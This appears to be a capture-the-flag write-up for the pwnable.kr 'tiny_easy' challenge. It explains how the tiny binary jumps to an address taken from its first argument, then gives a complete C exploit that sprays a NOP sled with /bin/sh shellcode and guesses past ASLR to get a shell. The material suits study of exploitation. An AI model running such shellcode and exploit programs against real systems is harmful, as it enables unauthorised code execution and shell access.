# tiny_easy

This challenge is about exploiting a very tiny program.

## The challenge

When program we have to exploit is only 4 instructions long which look like this:

```assembly
0x8048054: pop eax
0x8048055: pop edx
0x8048056: mov edx, DWORD PTR [edx]
0x8048058: call edx
```

To see which values were popped into *eax* and *edx*, I looked at the stack on the start of the program.

![](/home/nir/Documents/vuln-research/challenges/write-ups/pwnable.kr/tiny_easy/initial_stack.png)

So, after the first two instructions eax=1 and edx=0xffc40dbe, where 0xffc40dbe contains "/home/tiny_easy/tiny_easy". This means, that the first value is the program argument count, and the second value is the first argument, which means that first 4 bytes of the first argument of the program are stored in edx, and the next instruction calls the resulting address.

![](/home/nir/Documents/vuln-research/challenges/write-ups/pwnable.kr/tiny_easy/first_argument.png)

## The exploit

In order to exploit this program, we only need to point in the first argument to some address which contains our code. As the stack is executable, this would have been easy unless the program used ASLR, which it unfortunately does. Therefore, we cannot deterministically know what address to jump to, although we can guess.

The address space of the stack seems to be 0xff000000-0xffffffff, so we just need to put some shellcode in the program arguments and jump to a random address in that range, and hope we get it right. One thing that can increase our chances of reaching our code is putting a lot of NOP instructions before our shellcode so the range our code takes is much bigger and we have a better change of hitting it.

I wrote a small program that runs *tiny_easy* with the exploit, and some shellcode that executes /bin/sh that i copied from the internet.

```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

#define ARG_LENGTH (0x1fff0)

void main()
{
    uint8_t shellcode[] =
        	  "\x31\xd2\x31\xdb\x31\xc9\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
              "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
              "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81";
    uint8_t arg0[] = { '\x99', '\x99', '\xc5', '\xff', '\0' };
    uint8_t arg1[ARG_LENGTH] = { '\0' };
    uint8_t *const argv[3] = { arg0, arg1, NULL };
    memset(arg1, 0x90, ARG_LENGTH);
    memcpy((uint8_t*)arg1+ARG_LENGTH-sizeof(shellcode)-4, shellcode, sizeof(shellcode)-1);
    arg1[ARG_LENGTH-2] = 0xcc;
    arg1[ARG_LENGTH-1] = '\0';

    execve("/home/tiny_easy/tiny_easy", argv, NULL);
}

```

I ran this program in a loop and after a few times it worked!

![](/home/nir/Documents/vuln-research/challenges/write-ups/pwnable.kr/tiny_easy/running_the_exploit.png)